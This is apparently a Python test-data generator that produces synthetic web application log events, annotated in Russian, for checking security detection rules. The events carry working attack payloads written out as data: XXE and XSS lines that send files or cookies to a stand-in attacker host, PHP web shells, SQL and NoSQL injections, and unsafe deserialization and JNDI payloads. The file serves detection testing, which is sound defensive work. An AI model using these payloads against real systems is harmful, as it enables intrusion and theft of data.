         "request_path": "/graphql", "operation_name": "IntrospectionQuery",
         "query_text": "{__schema{types{name}}}", "query_depth": 3, "alias_count": 1,
         "batch_size": 1, "duration_ms": 40, "note": "introspection в проде"},
        {"ts": "2026-10-20T10:03:01Z", "source_ip": "10.10.20.9", "user_agent": "Mozilla/5.0",
         "request_path": "/graphql", "operation_name": "Deep",
         "query_text": "{a{b{c{d{e{f{g{h{i{j{}}}}}}}}}}", "query_depth": 11,
         "alias_count": 2, "batch_size": 1, "duration_ms": 900,
         "note": "аномально глубокий запрос"},
        {"ts": "2026-10-20T10:03:02Z", "source_ip": "10.10.20.9", "user_agent": "Mozilla/5.0",
         "request_path": "/graphql", "operation_name": "Batch",
         "query_text": '[{"query":"{me}"},{"query":"{me}"},{"query":"{me}"}]',
         "query_depth": 2, "alias_count": 1, "batch_size": 6, "duration_ms": 120,
         "note": "батчинг операций"},
        {"ts": "2026-10-20T10:03:03Z", "source_ip": "10.10.20.10", "user_agent": "Mozilla/5.0",
         "request_path": "/graphql", "operation_name": "Viewer",
         "query_text": "{viewer{name email}}", "query_depth": 2, "alias_count": 1,
         "batch_size": 1, "duration_ms": 15, "note": "обычный запрос — не совпадение"},

        # XXE-вариации (правила e5f6a7b8-0001..0006)
        {"ts": "2026-10-20T10:04:00Z", "source_ip": "10.10.20.16", "user_agent": "Mozilla/5.0",
         "request_path": "/import", "request_content_type": "application/xml",
         "request_body": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM '
                         '"http://attacker.tld/evil.dtd"> %x;]><root>1</root>',
         "error_message": "", "note": "blind XXE: внешняя DTD для OOB-эксфильтрации"},
        {"ts": "2026-10-20T10:04:01Z", "source_ip": "10.10.20.16", "user_agent": "Mozilla/5.0",
         "request_path": "/import", "request_content_type": "application/xml",
         "request_body": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM '
                         '"file:///etc/passwd"><!ENTITY % e "<!ENTITY &#x25; f SYSTEM '
                         '\x27http://attacker.tld/?d=%x;\x27>">%e;%f;]><root>1</root>',
         "error_message": "failed to load external entity 'http://attacker.tld/?d=root:x:0:0'",
         "note": "error-based XXE: содержимое файла в тексте ошибки"},
        {"ts": "2026-10-20T10:04:02Z", "source_ip": "10.10.20.16", "user_agent": "Mozilla/5.0",
         "request_path": "/convert", "request_content_type": "application/xml",
         "request_body": '<!DOCTYPE r [<!ENTITY a "xxxxxxxxxx"><!ENTITY b '
                         '"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c '
                         '"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><root>&c;</root>',
         "duration_ms": 18500,
         "error_message": "XML parse aborted: entity expansion limit exceeded",
         "note": "billion laughs: экспоненциальное раскрытие сущностей"},
        {"ts": "2026-10-20T10:04:03Z", "source_ip": "10.10.20.17", "user_agent": "Mozilla/5.0",
         "request_path": "/convert", "request_content_type": "application/xml",
         "request_body": '<?xml version="1.0"?><catalog><item id="1"/><item id="2"/></catalog>',
         "duration_ms": 900, "error_message": "",
         "note": "большой легитимный XML без сущностей — не совпадение"},
        {"ts": "2026-10-20T10:04:04Z", "source_ip": "10.10.20.17", "user_agent": "Mozilla/5.0",
         "request_path": "/soap", "request_content_type": "text/xml",
         "request_body": '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
                         '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
         "error_message": "", "note": "XInclude-фрагмент читает локальный файл"},
        {"ts": "2026-10-20T10:05:00Z", "source_ip": "10.10.20.18", "user_agent": "Mozilla/5.0",
         "event_action": "file_upload", "request_path": "/upload",
         "filename": "logo.svg", "content_type": "image/svg+xml",
         "file_preview": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM '
                         '"file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg">'
                         '<text x="0" y="20">&x;</text></svg>',
         "note": "загружен SVG с DOCTYPE и file-сущностью"},
        {"ts": "2026-10-20T10:05:01Z", "source_ip": "10.10.20.18", "user_agent": "Mozilla/5.0",
         "event_action": "file_upload", "request_path": "/upload",
         "filename": "icon.svg", "content_type": "image/svg+xml",
         "file_preview": '<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>',
         "note": "чистый SVG — не совпадение"},

        # Ошибки шаблонизаторов на стороне приложения (SSTI, правила 0007..0009)
        {"ts": "2026-10-20T10:06:00Z", "source_ip": "10.10.20.11", "user_agent": "Mozilla/5.0",
         "event_action": "template_render", "engine": "jinja2", "request_path": "/search",
         "template_source": "user_input",
         "error_message": "jinja2.exceptions.SecurityError: access to attribute "
                          "'config' of 'dict' object is unsafe",
         "note": "jinja2 sandbox отклонил обращение к config"},
        {"ts": "2026-10-20T10:06:01Z", "source_ip": "10.10.20.11", "user_agent": "Mozilla/5.0",
         "event_action": "template_render", "engine": "freemarker", "request_path": "/template",
         "template_source": "user_input",
         "error_message": "freemarker.template.utility.Execute — instantiation is not allowed",
         "note": "Freemarker отклонил Execute"},
        {"ts": "2026-10-20T10:06:02Z", "source_ip": "10.10.20.11", "user_agent": "Mozilla/5.0",
         "event_action": "template_render", "engine": "twig", "request_path": "/template",
         "template_source": "user_input",
         "error_message": "Twig\\Error\\RuntimeError: Calling \"system\" is not allowed",
         "note": "Twig отклонил вызов system"},
        {"ts": "2026-10-20T10:06:03Z", "source_ip": "10.10.20.19", "user_agent": "Mozilla/5.0",
         "event_action": "template_render", "engine": "mako", "request_path": "/email",
         "template_source": "static", "error_message": "",
         "note": "штатный рендер статического шаблона — не совпадение"},

        # SQL-инъекции на уровне приложения (правила e5f6a7b8-0031, 0035, 0040)
        {"ts": "2026-10-20T10:07:00Z", "source_ip": "10.10.20.30", "user_agent": "Mozilla/5.0",
         "event_action": "login", "event_outcome": "success", "request_path": "/login",
         "request_content_type": "application/x-www-form-urlencoded",
         "request_body": "username=admin' -- -&password=whatever",
         "note": "тавтология в форме входа: успех без валидного пароля"},
        {"ts": "2026-10-20T10:07:01Z", "source_ip": "10.10.20.38", "user_agent": "Mozilla/5.0",
         "event_action": "profile_update", "event_outcome": "success",
         "request_path": "/account/profile",
         "request_content_type": "application/x-www-form-urlencoded",
         "request_body": "org_name=ACME' UNION SELECT password_hash, api_key FROM users--",
         "note": "SQL-маркеры сохраняются в профиле (первая стадия second-order)"},
        {"ts": "2026-10-20T10:07:02Z", "source_ip": "10.10.20.38", "user_agent": "Mozilla/5.0",
         "event_action": "comment_create", "event_outcome": "success",
         "request_path": "/api/comments", "request_content_type": "application/json",
         "request_body": "{\"text\": \"nice' OR '1'='1' -- - LIMIT 1\"}",
         "note": "SQL-маркеры сохраняются в комментарии"},
        {"ts": "2026-10-20T10:07:03Z", "source_ip": "10.10.20.39", "user_agent": "Mozilla/5.0",
         "event_action": "search", "event_outcome": "failure",
         "request_path": "/api/users/search", "request_content_type": "application/json",
         "request_body": "{\"name\": \"' OR '1'='1\"}",
         "error_message": "org.hibernate.hql.internal.ast.QuerySyntaxException: "
                          "unexpected token [OR] near line 1, column 34",
         "note": "HQL-инъекция: ошибка Hibernate"},
        {"ts": "2026-10-20T10:07:04Z", "source_ip": "10.10.20.40", "user_agent": "Mozilla/5.0",
         "event_action": "login", "event_outcome": "success", "request_path": "/login",
         "request_content_type": "application/x-www-form-urlencoded",
         "request_body": "username=petrova&password=Secret123!",
         "note": "обычный вход — не совпадение"},

        # XSS на стороне приложения: stored/DOM/CSP (правила 0045..0054)
        {"ts": "2026-10-20T10:08:00Z", "source_ip": "10.10.20.42", "user_agent": "Mozilla/5.0",
         "event_action": "profile_update", "event_outcome": "success",
         "request_path": "/account/profile",
         "request_content_type": "application/x-www-form-urlencoded",
         "request_body": "website=javascript:alert(document.domain)",
         "note": "javascript:-схема сохранена в поле «сайт»"},
        {"ts": "2026-10-20T10:08:01Z", "source_ip": "10.10.20.42", "user_agent": "Mozilla/5.0",
         "event_action": "client_error", "request_path": "/search",
         "page_url": "https://app.corp.lab/search#<img src=x onerror=alert(1)>",
         "error_message": "TypeError: cannot read properties of null (innerHTML sink)",
         "note": "DOM XSS: payload в location.hash виден только клиентской телеметрии"},
        {"ts": "2026-10-20T10:08:02Z", "source_ip": "10.10.20.45", "user_agent": "Mozilla/5.0",
         "event_action": "comment_create", "event_outcome": "success",
         "request_path": "/api/comments", "request_content_type": "application/json",
         "request_body": "{\"text\": \"<listing>&lt;img src=x onerror=alert(1)&gt;</listing>\"}",
         "note": "mXSS: экранированный тег мутирует при перерисовке DOM"},
        {"ts": "2026-10-20T10:08:03Z", "source_ip": "10.10.20.43", "user_agent": "Mozilla/5.0",
         "event_action": "csp_report", "request_path": "/csp-report",
         "violated_directive": "script-src",
         "blocked_uri": "https://accounts.google.com/o/oauth2/revoke?callback=alert",
         "note": "CSP заблокировала JSONP-callback доверенного домена"},
        {"ts": "2026-10-20T10:08:04Z", "source_ip": "10.10.20.43", "user_agent": "Mozilla/5.0",
         "event_action": "pdf_generate", "generator": "wkhtmltopdf",
         "request_path": "/report/pdf",
         "request_body": "title=<script>fetch('http://attacker.tld/?c='+document.cookie)</script>",
         "note": "JS в шаблоне, который рендерит HTML->PDF-конвейер"},
        {"ts": "2026-10-20T10:08:05Z", "source_ip": "10.10.20.45", "user_agent": "Mozilla/5.0",
         "event_action": "profile_update", "event_outcome": "success",
         "request_path": "/account/profile", "request_content_type": "application/json",
         "request_body": "{\"bio\": \"<details open ontoggle=alert(document.domain)>click</details>\"}",
         "note": "stored XSS в биографии профиля"},
        {"ts": "2026-10-20T10:08:06Z", "source_ip": "10.10.20.45", "user_agent": "Mozilla/5.0",
         "event_action": "comment_create", "event_outcome": "success",
         "request_path": "/api/comments", "request_content_type": "application/json",
         "request_body": "{\"text\": \"{{constructor.constructor('alert(1)')()}}\"}",
         "note": "Angular: template-инъекция в сохраняемом тексте"},
        {"ts": "2026-10-20T10:08:07Z", "source_ip": "10.10.20.46", "user_agent": "Mozilla/5.0",
         "event_action": "csp_report", "request_path": "/csp-report",
         "violated_directive": "require-trusted-types-for 'script'",
         "blocked_uri": "inline",
         "note": "Trusted Types: сырая строка в innerHTML отклонена браузером"},

        # Загрузки файлов (правила 0055..0061)
        {"ts": "2026-10-20T10:09:00Z", "source_ip": "10.10.20.47", "user_agent": "curl/8.4.0",
         "event_action": "file_upload", "event_outcome": "failure", "request_path": "/upload",
         "filename": "../../../../var/www/html/shell.php",
         "content_type": "application/octet-stream",
         "file_preview": "<?php system($_GET['c']); ?>",
         "note": "traversal в имени файла: запись в веб-корень"},
        {"ts": "2026-10-20T10:09:01Z", "source_ip": "10.10.20.47", "user_agent": "curl/8.4.0",
         "event_action": "file_upload", "event_outcome": "failure", "request_path": "/upload",
         "filename": "..\\..\\inetpub\\wwwroot\\shell.aspx",
         "content_type": "application/octet-stream",
         "note": "traversal обратными слешами (Windows)"},
        {"ts": "2026-10-20T10:09:02Z", "source_ip": "10.10.20.47", "user_agent": "curl/8.4.0",
         "event_action": "file_upload", "event_outcome": "success", "request_path": "/upload",
         "filename": ".htaccess", "content_type": "text/plain",
         "file_preview": "AddType application/x-httpd-php .jpg .png .txt",
         "note": "загрузка .htaccess для переопределения обработчика"},
        {"ts": "2026-10-20T10:09:03Z", "source_ip": "10.10.20.48", "user_agent": "curl/8.4.0",
         "event_action": "file_upload", "event_outcome": "success", "request_path": "/upload",
         "filename": "avatar.gif", "content_type": "image/gif",
         "file_preview": "GIF89a;\n<?php system($_GET['c']); ?>",
         "note": "полиглот: PHP-код после магических байтов GIF"},
        {"ts": "2026-10-20T10:09:04Z", "source_ip": "10.10.20.48", "user_agent": "curl/8.4.0",
         "event_action": "file_upload", "event_outcome": "success", "request_path": "/upload",
         "filename": "avatar.php", "content_type": "image/jpeg",
         "file_preview": "\xff\xd8\xff\xe0JFIF (заявлен jpeg, расширение php)",
         "note": "подмена Content-Type: php-файл представлен картинкой"},
        {"ts": "2026-10-20T10:09:05Z", "source_ip": "10.10.20.48", "user_agent": "curl/8.4.0",
         "event_action": "file_upload", "event_outcome": "success", "request_path": "/upload",
         "filename": "shell.php.jpg", "content_type": "image/jpeg",
         "file_preview": "\xff\xd8\xff\xe0JFIF",
         "note": "двойное расширение .php.jpg"},
        {"ts": "2026-10-20T10:09:06Z", "source_ip": "10.10.20.49", "user_agent": "Mozilla/5.0",
         "event_action": "file_upload", "event_outcome": "success", "request_path": "/upload",
         "filename": "banner.svg", "content_type": "image/svg+xml",
         "file_preview": "<svg xmlns=\"http://www.w3.org/2000/svg\" "
                         "onload=\"alert(document.domain)\"><text>hackbook</text></svg>",
         "note": "SVG с onload — stored XSS через картинку"},
        {"ts": "2026-10-20T10:09:07Z", "source_ip": "10.10.20.49", "user_agent": "Mozilla/5.0",
         "event_action": "archive_extract", "event_outcome": "success",
         "request_path": "/import", "filename": "evil.zip",
         "file_preview": "entry: ../../shell.php",
         "note": "Zip Slip: запись вне целевого каталога при распаковке"},
        {"ts": "2026-10-20T10:09:08Z", "source_ip": "10.10.20.50", "user_agent": "Mozilla/5.0",
         "event_action": "file_upload", "event_outcome": "success", "request_path": "/upload",
         "filename": "photo.jpg", "content_type": "image/jpeg",
         "file_preview": "\xff\xd8\xff\xe0JFIF обычная фотография",
         "note": "обычная загрузка картинки — не совпадение"},

        # LFI/SSRF на стороне приложения (0065, 0073)
        {"ts": "2026-10-20T10:10:00Z", "source_ip": "10.10.20.53", "user_agent": "curl/8.4.0",
         "request_path": "/include.php", "request_content_type": "text/plain",
         "request_body": "<?php system($_GET['c']); ?>", "error_message": "",
         "note": "тело POST исполняется через php://input"},
        {"ts": "2026-10-20T10:10:01Z", "source_ip": "10.10.20.56", "user_agent": "Mozilla/5.0",
         "event_action": "url_fetch", "request_path": "/fetch",
         "url_fetched": "https://allowed.example.com/r?to=http://169.254.169.254/"
                        "latest/meta-data/",
         "status_code": 200,
         "note": "сервер проследовал по цепочке редиректов на адрес метаданных"},

        # NoSQL-инъекции (0074..0078)
        {"ts": "2026-10-20T10:11:00Z", "source_ip": "10.10.20.57", "user_agent": "Mozilla/5.0",
         "event_action": "login", "event_outcome": "success", "request_path": "/api/login",
         "request_content_type": "application/json",
         "request_body": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
         "note": "обход аутентификации Mongo через $ne"},
        {"ts": "2026-10-20T10:11:01Z", "source_ip": "10.10.20.57", "user_agent": "Mozilla/5.0",
         "event_action": "api_query", "request_path": "/api/users",
         "request_content_type": "application/json",
         "request_body": "{\"role\": {\"$gt\": \"\"}}",
         "note": "инъекция оператора $gt: перечисление ролей"},
        {"ts": "2026-10-20T10:11:02Z", "source_ip": "10.10.20.60", "user_agent": "Mozilla/5.0",
         "event_action": "login", "event_outcome": "failure", "request_path": "/api/login",
         "request_content_type": "application/json",
         "request_body": "{\"email\": {\"$regex\": \"^a.*\"}, \"password\": {\"$ne\": null}}",
         "note": "слепой перебор email через $regex: ^a"},
        {"ts": "2026-10-20T10:11:03Z", "source_ip": "10.10.20.60", "user_agent": "Mozilla/5.0",
         "event_action": "login", "event_outcome": "failure", "request_path": "/api/login",
         "request_content_type": "application/json",
         "request_body": "{\"email\": {\"$regex\": \"^ad.*\"}, \"password\": {\"$ne\": null}}",
         "note": "слепой перебор email через $regex: ^ad"},
        {"ts": "2026-10-20T10:11:04Z", "source_ip": "10.10.20.57", "user_agent": "Mozilla/5.0",
         "event_action": "api_query", "request_path": "/api/search",
         "request_content_type": "application/json",
         "request_body": "{\"$where\": \"sleep(3000)\"}", "duration_ms": 3100,
         "note": "$where с JS-кодом: time-based проверка"},
        {"ts": "2026-10-20T10:11:05Z", "source_ip": "10.10.20.58", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/api/search",
         "request_content_type": "application/json",
         "request_body": "{\"query\": {\"match_all\": {}}, \"size\": 10000}",
         "note": "Elasticsearch DSL: match_all с гигантским size"},
        {"ts": "2026-10-20T10:11:06Z", "source_ip": "10.10.20.59", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/db/_find",
         "request_content_type": "application/json",
         "request_body": "{\"selector\": {\"_id\": {\"$gt\": null}}, "
                         "\"fields\": [\"_id\", \"password\"], \"limit\": 1000}",
         "note": "CouchDB Mango-запрос на выгрузку паролей"},

        # Бизнес-логика (0079..0081)
        {"ts": "2026-10-20T10:12:00Z", "source_ip": "10.10.20.61", "user_agent": "Mozilla/5.0",
         "event_action": "order_create", "request_path": "/api/checkout",
         "request_content_type": "application/json",
         "request_body": "{\"items\":[{\"id\":7,\"qty\":-3,\"price\":1}],"
                         "\"currency\":\"VND\",\"coupon\":\"ONCE100\"}",
         "note": "отрицательное количество и манипуляция валютой"},
        {"ts": "2026-10-20T10:12:01Z", "source_ip": "10.10.20.62", "user_agent": "Mozilla/5.0",
         "event_action": "checkout_confirm", "request_path": "/checkout/confirm",
         "order_id": "1042", "payment_status": "unpaid",
         "note": "подтверждение заказа в обход шага оплаты"},
        {"ts": "2026-10-20T10:12:02Z", "source_ip": "10.10.20.63", "user_agent": "Mozilla/5.0",
         "event_action": "checkout_confirm", "request_path": "/checkout/confirm",
         "order_id": "1043", "payment_status": "paid",
         "note": "обычное подтверждение оплаченного заказа — не совпадение"},

        # HTTP-заголовки/JWT/CSRF/OAuth на стороне приложения (0082..0089)
        {"ts": "2026-10-20T10:13:00Z", "source_ip": "10.10.20.62", "user_agent": "Mozilla/5.0",
         "event_action": "auth_log",
         "message": "login SUCCESS user=admin ip=1.2.3.4\r\nlogin FAIL user=x ip=1.2.3.5",
         "note": "log forging: в одной записи появилась подделанная вторая строка"},
        {"ts": "2026-10-20T10:13:01Z", "source_ip": "10.10.20.66", "user_agent": "Mozilla/5.0",
         "event_action": "password_reset", "request_path": "/forgot-password",
         "host_header": "attacker.tld", "x_forwarded_host": "attacker.tld",
         "reset_link_host": "attacker.tld",
         "note": "ссылка сброса пароля ведёт на сторонний хост из Host-заголовка"},
        {"ts": "2026-10-20T10:13:02Z", "source_ip": "10.10.20.67", "user_agent": "Mozilla/5.0",
         "event_action": "password_reset", "request_path": "/forgot-password",
         "host_header": "app.corp.lab", "x_forwarded_host": "",
         "reset_link_host": "app.corp.lab",
         "note": "легитимный сброс пароля — не совпадение"},
        {"ts": "2026-10-20T10:13:03Z", "source_ip": "10.10.20.63", "user_agent": "Mozilla/5.0",
         "event_action": "csrf_check", "event_outcome": "failure",
         "failure_reason": "csrf token missing", "request_path": "/account/email",
         "referer": "https://evil.tld/attack.html",
         "note": "CSRF: межсайтовый POST без токена отклонён (или принят — см. outcome)"},
        {"ts": "2026-10-20T10:13:04Z", "source_ip": "10.10.20.64", "user_agent": "Mozilla/5.0",
         "event_action": "oauth_authorize", "event_outcome": "success",
         "request_path": "/authorize",
         "redirect_uri": "https://app.example/.%2e%2fprofile%2f..%2f..%2f"
                         "redirect%3furl%3dhttps://attacker.tld",
         "note": "OAuth: redirect_uri прошёл валидацию за счёт нормализации пути"},
        {"ts": "2026-10-20T10:14:00Z", "source_ip": "10.10.20.70", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "failure",
         "failure_reason": "invalid signature", "jwt_alg": "HS256", "jwt_kid": "rsa-key-1",
         "token_sub": "guest", "note": "RS2HS-проба: HMAC-подпись проверяется публичным ключом"},
        {"ts": "2026-10-20T10:14:01Z", "source_ip": "10.10.20.70", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "success",
         "jwt_alg": "HS256", "jwt_kid": "rsa-main", "token_sub": "admin",
         "note": "RS2HS удалась: токен с role=admin принят"},
        {"ts": "2026-10-20T10:14:02Z", "source_ip": "10.10.20.71", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "failure",
         "failure_reason": "key not found", "jwt_alg": "HS256",
         "jwt_kid": "../../../../dev/null", "token_sub": "guest",
         "note": "kid-инъекция: traversal к пустому ключу /dev/null"},
        {"ts": "2026-10-20T10:14:03Z", "source_ip": "10.10.20.71", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "failure",
         "failure_reason": "invalid signature", "jwt_alg": "HS256",
         "jwt_kid": "../../keys/old.pem", "token_sub": "guest",
         "note": "kid-инъекция: указатель на старый/известный ключ"},
        {"ts": "2026-10-20T10:14:04Z", "source_ip": "10.10.20.72", "user_agent": "curl/8.4.0",
         "event_action": "jwt_verify", "event_outcome": "failure",
         "failure_reason": "unsupported alg", "jwt_alg": "None", "jwt_kid": "",
         "token_sub": "guest", "note": "alg=None отклонён корректной библиотекой"},
    ] + [
        # Подбор слабого HMAC-секрета JWT: 12 провалов подписи от одного IP (0106)
        {"ts": f"2026-10-20T10:15:{i:02d}Z", "source_ip": "10.10.20.88",
         "user_agent": "python-requests/2.31", "event_action": "jwt_verify",
         "event_outcome": "failure", "failure_reason": "invalid signature",
         "jwt_alg": "HS256", "jwt_kid": "", "token_sub": "guest",
         "note": f"перебор HMAC-секрета, попытка {i}"}
        for i in range(1, 13)
    ] + [
        # Auth-bypass (0102..0104, 0107)
        {"ts": "2026-10-20T10:16:00Z", "source_ip": "10.10.20.75", "user_agent": "Mozilla/5.0",
         "event_action": "resource_access", "request_path": "/account/settings",
         "twofa_status": "challenge_pending", "session_user": "guest42",
         "note": "доступ к защищённому разделу до прохождения 2FA"},
        {"ts": "2026-10-20T10:16:01Z", "source_ip": "10.10.20.75", "user_agent": "Mozilla/5.0",
         "event_action": "auth_flow", "request_path": "/account/settings",
         "from_step": "password_ok", "to_step": "account_settings",
         "skipped_step": "totp_verify", "note": "flow перепрыгнул шаг 2FA"},
        {"ts": "2026-10-20T10:16:02Z", "source_ip": "10.10.20.76", "user_agent": "Mozilla/5.0",
         "event_action": "login", "event_outcome": "success", "request_path": "/admin/login",
         "request_body": "username=admin&password=admin",
         "note": "вход с дефолтной парой admin:admin"},
        {"ts": "2026-10-20T10:16:03Z", "source_ip": "10.10.20.76", "user_agent": "Mozilla/5.0",
         "event_action": "login", "event_outcome": "success", "request_path": "/login",
         "request_body": "username=root&password=toor",
         "note": "вход с дефолтной парой root:toor"},
        {"ts": "2026-10-20T10:16:04Z", "source_ip": "10.10.20.77", "user_agent": "Mozilla/5.0",
         "event_action": "object_access", "object_type": "invoice", "object_id": "1002",
         "session_user_id": "57", "owner_user_id": "58", "user_is_owner": False,
         "event_outcome": "success", "request_path": "/api/v1/invoices/1002",
         "note": "IDOR: чужой счёт прочитан по последовательному id"},
        {"ts": "2026-10-20T10:16:05Z", "source_ip": "10.10.20.77", "user_agent": "Mozilla/5.0",
         "event_action": "object_access", "object_type": "invoice", "object_id": "1003",
         "session_user_id": "57", "owner_user_id": "59", "user_is_owner": False,
         "event_outcome": "success", "request_path": "/api/v1/invoices/1003",
         "note": "IDOR: перебор соседних id"},
        {"ts": "2026-10-20T10:16:06Z", "source_ip": "10.10.20.77", "user_agent": "Mozilla/5.0",
         "event_action": "object_access", "object_type": "invoice", "object_id": "1001",
         "session_user_id": "57", "owner_user_id": "57", "user_is_owner": True,
         "event_outcome": "success", "request_path": "/api/v1/invoices/1001",
         "note": "свой объект — не совпадение"},

        # Десериализация (0108..0117)
        {"ts": "2026-10-20T10:17:00Z", "source_ip": "10.10.20.78", "user_agent": "Mozilla/5.0",
         "event_action": "session_load", "event_outcome": "failure",
         "failure_reason": "cookie signature mismatch — possible tampering",
         "request_path": "/", "note": "подделка подписанного cookie (Flask session)"},
        {"ts": "2026-10-20T10:17:01Z", "source_ip": "10.10.20.78", "user_agent": "Mozilla/5.0",
         "event_action": "session_load", "event_outcome": "success",
         "session_role": "admin", "expected_role": "user", "request_path": "/",
         "note": "роль в cookie выше роли в БД — state forgery удалась"},
        {"ts": "2026-10-20T10:17:02Z", "source_ip": "10.10.20.79", "user_agent": "Mozilla/5.0",
         "event_action": "request", "request_path": "/Default.aspx",
         "request_content_type": "application/x-www-form-urlencoded",
         "request_body": "__VIEWSTATE=/wEPDwUKMTIzNDU2Nzg5MA9kFgICAQ8WAh4EVGV4dAUJaGFja2Jvb2s=",
         "error_message": "", "note": "обычный ViewState ASP.NET-страницы"},
        {"ts": "2026-10-20T10:17:03Z", "source_ip": "10.10.20.79", "user_agent": "Mozilla/5.0",
         "event_action": "request", "request_path": "/Default.aspx",
         "request_content_type": "application/x-www-form-urlencoded",
         "request_body": "__VIEWSTATE=/wEPDwULLTE2MTY0...",
         "error_message": "The state information is invalid for this page and might be corrupted",
         "note": "подделка ViewState без MAC-валидации"},
        {"ts": "2026-10-20T10:17:04Z", "source_ip": "10.10.20.80", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/api/json",
         "request_content_type": "application/json",
         "request_body": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                         "\"dataSourceName\":\"ldap://attacker.tld/Exploit\",\"autoCommit\":true}",
         "note": "fastjson autoType: JNDI-загрузка класса"},
        {"ts": "2026-10-20T10:17:05Z", "source_ip": "10.10.20.80", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/api/json",
         "request_content_type": "application/json", "request_body": "{\"@type\":\"java.lang.Runtime\"}",
         "error_message": "com.alibaba.fastjson.JSONException: autoType is not support. java.lang.Runtime",
         "note": "autoType заблокирован — попытка видна в ошибке"},
        {"ts": "2026-10-20T10:17:06Z", "source_ip": "10.10.20.81", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/api/import",
         "request_content_type": "application/x-java-serialized-object",
         "request_body": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwAC...",
         "note": "Java-сериализация (base64 rO0AB = AC ED 00 05) в теле запроса"},
        {"ts": "2026-10-20T10:17:07Z", "source_ip": "10.10.20.81", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/api/import",
         "request_body": "aced0005737200116a6176612e7574696c2e486173684d6170",
         "note": "Java-сериализация в hex-виде"},
        {"ts": "2026-10-20T10:17:08Z", "source_ip": "10.10.20.81", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/api/import", "request_body": "",
         "error_message": "java.io.InvalidClassException: filter status: REJECTED",
         "note": "JEP 290 deserialization filter отклонил поток"},
        {"ts": "2026-10-20T10:17:09Z", "source_ip": "10.10.20.82", "user_agent": "Mozilla/5.0",
         "event_action": "api_query", "request_path": "/api/settings",
         "request_content_type": "application/json",
         "request_body": "{\"__proto__\": {\"isAdmin\": true}}",
         "note": "prototype pollution: __proto__ в JSON-теле"},
        {"ts": "2026-10-20T10:17:10Z", "source_ip": "10.10.20.82", "user_agent": "Mozilla/5.0",
         "event_action": "api_query", "request_path": "/api/settings",
         "request_content_type": "application/json",
         "request_body": "{\"a\":1,\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
         "note": "prototype pollution через constructor.prototype"},
        {"ts": "2026-10-20T10:17:11Z", "source_ip": "10.10.20.83", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/cart",
         "request_body": "O:4:\"User\":2:{s:4:\"role\";s:5:\"admin\";s:2:\"id\";i:1;}",
         "note": "PHP-сериализованный объект в параметре/cookie"},
        {"ts": "2026-10-20T10:17:12Z", "source_ip": "10.10.20.83", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/cart", "request_body": "Tzo0OiJVc2VyIjoyOnt9",
         "error_message": "Warning: unserialize(): Error at offset 0 of 45 bytes",
         "note": "PHP unserialize() упал на подделанной строке"},
        {"ts": "2026-10-20T10:17:13Z", "source_ip": "10.10.20.84", "user_agent": "curl/8.4.0",
         "event_action": "task_import", "request_path": "/api/tasks",
         "request_body": "cos\nsystem\np0\n(S'id'\np1\ntp2\nRp3.",
         "note": "pickle-опкоды (cos/system/Reduce) в теле запроса"},
        {"ts": "2026-10-20T10:17:14Z", "source_ip": "10.10.20.84", "user_agent": "curl/8.4.0",
         "event_action": "task_import", "request_path": "/api/tasks", "request_body": "gASV...",
         "error_message": "AttributeError: Can't get attribute 'Probe' on <module '__main__'>",
         "note": "pickle пытался восстановить несуществующий класс — проба десериализации"},
        {"ts": "2026-10-20T10:17:15Z", "source_ip": "10.10.20.85", "user_agent": "Mozilla/5.0",
         "event_action": "request", "request_path": "/api/lookup",
         "request_body": "name=example", 
         "error_message": "javax.naming.CommunicationException: "
                          "ldap://attacker.tld:1389/Exploit",
         "note": "JNDI-lookup на внешний LDAP-сервер атакующего"},
        {"ts": "2026-10-20T10:17:16Z", "source_ip": "10.10.20.86", "user_agent": "curl/8.4.0",
         "event_action": "api_query", "request_path": "/api/xml",
         "request_content_type": "application/xml",
         "request_body": "<map><entry><string>hb</string><dynamic-proxy>"
                         "<interface>java.lang.Comparable</interface>"
                         "<handler class=\"java.beans.EventHandler\">...</handler>"
                         "</dynamic-proxy></entry></map>",
         "note": "XStream dynamic-proxy гаджет"},
        {"ts": "2026-10-20T10:17:17Z", "source_ip": "10.10.20.87", "user_agent": "curl/8.4.0",
         "event_action": "config_import", "request_path": "/api/config",
         "request_content_type": "application/yaml",
         "request_body": "!!python/object/apply:os.system ['id']",
         "note": "PyYAML unsafe-load: конструктор выполняет команду"},
        {"ts": "2026-10-20T10:17:18Z", "source_ip": "10.10.20.87", "user_agent": "curl/8.4.0",
         "event_action": "config_import", "request_path": "/api/config",
         "request_content_type": "application/yaml",
         "request_body": "!!python/object/apply:subprocess.Popen ['id']",
         "error_message": "yaml.constructor.ConstructorError: could not determine "
                          "a constructor for the tag '!!python/object/apply:subprocess.Popen'",
         "note": "безопасный загрузчик отклонил python-тег"},
    ]


def cloudtrail() -> list[dict]:
    iam_events = ["CreatePolicyVersion", "SetDefaultPolicyVersion", "AttachRolePolicy",
                  "AttachUserPolicy", "AttachGroupPolicy", "PutRolePolicy", "PutUserPolicy",
